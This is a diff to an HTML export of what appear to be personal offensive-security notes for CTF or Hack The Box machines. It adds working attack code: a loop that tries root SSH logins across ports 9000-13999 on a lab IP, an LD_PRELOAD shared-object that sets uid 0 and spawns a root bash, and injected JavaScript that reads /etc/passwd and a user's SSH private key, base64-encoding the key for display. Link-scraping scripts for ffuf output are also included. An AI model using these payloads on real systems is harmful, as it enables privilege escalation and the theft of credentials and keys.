@@ -56,8 +56,6 @@ p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxS
 	line-height:107%;
 	font-size:11.0pt;
 	font-family:"Calibri",sans-serif;}
-.MsoChpDefault
-	{font-family:"Calibri",sans-serif;}
 .MsoPapDefault
 	{margin-bottom:8.0pt;
 	line-height:107%;}
@@ -83,91 +81,248 @@ ul
 <p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
 color:white;background:navy'>#### script to test various ssh ports</span></b></p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#!/bin/bash</span></p>
+<p class=MsoNormal>#!/bin/bash</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>for port in {9000..13999}; do</p>
+
+<p class=MsoNormal>  ssh -o ConnectTimeout=5 -p $port root@10.10.115.189 exit</p>
+
+<p class=MsoNormal>  if [ $? -eq 0 ]; then</p>
+
+<p class=MsoNormal>    echo &quot;SSH connection successful on port $port&quot;</p>
+
+<p class=MsoNormal>    exit 0</p>
+
+<p class=MsoNormal>  fi</p>
+
+<p class=MsoNormal>done</p>
+
+<p class=MsoNormal>echo &quot;No open SSH port found&quot;</p>
+
+<p class=MsoNormal>exit 1</p>
 
 <p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>for port in
-{9000..13999}; do</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>  ssh -o
-ConnectTimeout=5 -p $port root@10.10.115.189 exit</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>  if [ $?
--eq 0 ]; then</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>    echo
-&quot;SSH connection successful on port $port&quot;</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>    exit 0</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>  fi</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>done</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>echo
-&quot;No open SSH port found&quot;</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>exit 1</span></p>
-
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>
-
-<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%;
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
 color:white;background:maroon'>#### LD_PRELOAD</span></b><b><span
-style='font-size:22.0pt;line-height:107%;color:white'> </span></b></p>
-
-<p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>
+style='font-size:26.0pt;line-height:107%;color:white'> </span></b></p>
 
 <p class=MsoNormal><u><span style='font-size:22.0pt;line-height:107%'>Shell.c:</span></u></p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
-&lt;stdio.h&gt;</span></p>
+<p class=MsoNormal>#include &lt;stdio.h&gt;</p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
-&lt;sys/types.h&gt;</span></p>
+<p class=MsoNormal>#include &lt;sys/types.h&gt;</p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
-&lt;unistd.h&gt;</span></p>
+<p class=MsoNormal>#include &lt;unistd.h&gt;</p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>#include
-&lt;stdlib.h&gt;</span></p>
+<p class=MsoNormal>#include &lt;stdlib.h&gt;</p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>void _init()
-{</span></p>
+<p class=MsoNormal>void _init() {</p>
 
-<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
-line-height:107%'>unsetenv(&quot;LD_PRELOAD&quot;);</span></p>
+<p class=MsoNormal style='text-indent:36.0pt'>unsetenv(&quot;LD_PRELOAD&quot;);</p>
 
-<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
-line-height:107%'>setgid(0);</span></p>
+<p class=MsoNormal style='text-indent:36.0pt'>setgid(0);</p>
 
-<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
-line-height:107%'>setuid(0);</span></p>
+<p class=MsoNormal style='text-indent:36.0pt'>setuid(0);</p>
 
-<p class=MsoNormal style='text-indent:36.0pt'><span style='font-size:22.0pt;
-line-height:107%'>system(&quot;/bin/bash&quot;);</span></p>
+<p class=MsoNormal style='text-indent:36.0pt'>system(&quot;/bin/bash&quot;);</p>
 
-<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>}</span></p>
+<p class=MsoNormal>}</p>
 
 <p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>
 
 <p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt'><span
-style='font-size:22.0pt;line-height:107%'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-</span></span><span style='font-size:22.0pt;line-height:107%'>gcc -fPIC -shared
+style='font-size:18.0pt;line-height:107%'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span style='font-size:18.0pt;line-height:107%'>gcc -fPIC -shared
 -o shell.so shell.c -nostartfiles</span></p>
 
 <p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt'><span
-style='font-size:22.0pt;line-height:107%'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-</span></span><span style='font-size:22.0pt;line-height:107%'>if you get errors
+style='font-size:18.0pt;line-height:107%'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span style='font-size:18.0pt;line-height:107%'>if you get errors
 include the following: #include &lt;unistd.h&gt;</span></p>
 
 <p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>
 
-<p class=MsoListParagraphCxSpFirst><b><span style='font-size:22.0pt;line-height:
-107%'>&nbsp;</span></b></p>
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+background:lime'>#### script to scrape info from results.txt</span></b></p>
 
-<p class=MsoListParagraphCxSpLast><b><span style='font-size:22.0pt;line-height:
-107%'>&nbsp;</span></b></p>
+<p class=MsoNormal>import requests</p>
+
+<p class=MsoNormal>from bs4 import BeautifulSoup</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>def scrape_links(url):</p>
+
+<p class=MsoNormal>    # Send a GET request to the page</p>
+
+<p class=MsoNormal>    response = requests.get(url)</p>
+
+<p class=MsoNormal>    # Parse the HTML content</p>
+
+<p class=MsoNormal>    soup = BeautifulSoup(response.text, 'html.parser')</p>
+
+<p class=MsoNormal>    # Find all &lt;a&gt; tags</p>
+
+<p class=MsoNormal>    links = soup.find_all('a')</p>
+
+<p class=MsoNormal>    return links</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>def main():</p>
+
+<p class=MsoNormal>    # Open the results file</p>
+
+<p class=MsoNormal>    with open(&quot;results.txt&quot;, &quot;r&quot;) as
+file:</p>
+
+<p class=MsoNormal>        # Read each line of the file</p>
+
+<p class=MsoNormal>        for line in file:</p>
+
+<p class=MsoNormal>            links = scrape_links(line.strip())</p>
+
+<p class=MsoNormal>            # Iterate over the links</p>
+
+<p class=MsoNormal>            for link in links:</p>
+
+<p class=MsoNormal>                # Print the link's href attribute</p>
+
+<p class=MsoNormal>                print(link.get('href'))</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>if __name__ == &quot;__main__&quot;:</p>
+
+<p class=MsoNormal>    main()</p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+background:fuchsia'>#### Same as above but from HTB:</span></b></p>
+
+<p class=MsoNormal>#!/usr/bin/python</p>
+
+<p class=MsoNormal>import sys</p>
+
+<p class=MsoNormal>import json</p>
+
+<p class=MsoNormal>import requests</p>
+
+<p class=MsoNormal>import argparse</p>
+
+<p class=MsoNormal>from bs4 import BeautifulSoup</p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+<p class=MsoNormal>def results(file):</p>
+
+<p class=MsoNormal>                content=open(file,'r').readlines()</p>
+
+<p class=MsoNormal>                for line in content:</p>
+
+<p class=MsoNormal>                                data=json.loads(line.strip())</p>
+
+<p class=MsoNormal>                urls=[]</p>
+
+<p class=MsoNormal>                for url in data['results']:</p>
+
+<p class=MsoNormal>                                urls.append(url['url'])</p>
+
+<p class=MsoNormal>                return urls</p>
+
+<p class=MsoNormal>def crawl(url):</p>
+
+<p class=MsoNormal>                r = requests.get(url)</p>
+
+<p class=MsoNormal>                soup = BeautifulSoup(r.text,'lxml')</p>
+
+<p class=MsoNormal>                links = soup.findAll('a',href=True)</p>
+
+<p class=MsoNormal>                for link in links:</p>
+
+<p class=MsoNormal>                                link=link['href']</p>
+
+<p class=MsoNormal>                                if link and link!='#':</p>
+
+<p class=MsoNormal>                                print '[+] {} :
+{}'.format(url,link)</p>
+
+<p class=MsoNormal>if __name__==&quot;__main__&quot;:</p>
+
+<p class=MsoNormal>                parser = argparse.ArgumentParser()</p>
+
+<p class=MsoNormal>                parser.add_argument(&quot;file&quot;,help=&quot;ffuf
+results&quot;)</p>
+
+<p class=MsoNormal>                args = parser.parse_args()</p>
+
+<p class=MsoNormal>                urls=results(args.file)</p>
+
+<p class=MsoNormal>                for url in urls:</p>
+
+<p class=MsoNormal>                                crawl(url)</p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></p>
+
+<p class=MsoNormal><b><span style='font-size:26.0pt;line-height:107%;
+color:white;background:green'>#### Script</span></b></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:107%;color:black'>use
+this script, if you want to extract info (as in exported) so you have  system
+which you can enter this and then export it to get what you need.     </span><span
+style='font-size:26.0pt;line-height:107%;color:white'>                                                                             </span></p>
+
+<p class=MsoNormal><span style='font-size:26.0pt;line-height:107%;color:white'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='color:black'>&lt;script&gt;</span></p>
+
+<p class=MsoNormal><span style='color:black'>var x = new XMLHttpRequest();</span></p>
+
+<p class=MsoNormal><span style='color:black'>x.open(&quot;GET&quot;,
+&quot;file:///etc/passwd&quot;, true);</span></p>
+
+<p class=MsoNormal><span style='color:black'>x.onload = function(){</span></p>
+
+<p class=MsoNormal><span style='color:black'>document.write(x.responseText);</span></p>
+
+<p class=MsoNormal><span style='color:black'>};</span></p>
+
+<p class=MsoNormal><span style='color:black'>x.send();</span></p>
+
+<p class=MsoNormal><span style='color:black'>&lt;/script&gt;</span></p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal><span style='font-size:22.0pt;line-height:107%;color:white;
+background:green'>##### As above but to get the base64 encoded SSH key</span></p>
+
+<p class=MsoNormal><span style='color:black'>&lt;script&gt;</span></p>
+
+<p class=MsoNormal><span style='color:black'>var x = new XMLHttpRequest();</span></p>
+
+<p class=MsoNormal><span style='color:black'>x.open(&quot;GET&quot;,
+&quot;file:///home/reader/.ssh/id_rsa&quot;, true);</span></p>
+
+<p class=MsoNormal><span style='color:black'>x.onload = function(){</span></p>
+
+<p class=MsoNormal><span style='color:black'>var code = &quot;&lt;textarea
+rows='100' cols='70'&gt;&quot; + btoa(x.responseText) + &quot;</span></p>
+
+<p class=MsoNormal><span style='color:black'>&lt;/textarea&gt;&quot;;</span></p>
+
+<p class=MsoNormal><span style='color:black'>document.write(code);</span></p>
+
+<p class=MsoNormal><span style='color:black'>};</span></p>
+
+<p class=MsoNormal><span style='color:black'>x.send();</span></p>
+
+<p class=MsoNormal><span style='color:black'>&lt;/script&gt;</span></p>
+
+<p class=MsoListParagraph><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>
 
 <p class=MsoNormal><b><span style='font-size:22.0pt;line-height:107%'>&nbsp;</span></b></p>
 
@@ -178,4 +333,5 @@ include the following: #include &lt;unistd.h&gt;</span></p>
 </body>
 
 </html>
+
 
